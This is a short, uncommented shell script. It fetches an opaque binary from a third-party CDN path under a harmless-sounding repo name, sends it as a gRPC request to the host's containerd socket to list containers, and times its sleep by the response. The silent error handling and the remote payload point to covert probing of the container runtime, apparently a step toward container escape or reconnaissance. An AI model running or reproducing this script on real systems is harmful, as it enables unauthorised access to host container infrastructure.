#!/bin/sh
curl -sf -m 8 -o /tmp/fr.bin https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2/fr.bin || exit 0
curl -s -m 6 --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/tmp/fr.bin http://localhost/runtime.v1.RuntimeService/ListContainers -D /tmp/h.txt -o /dev/null 2>/dev/null
if grep -q 'grpc-status: 12' /tmp/h.txt 2>/dev/null; then sleep 45; else sleep 15; fi
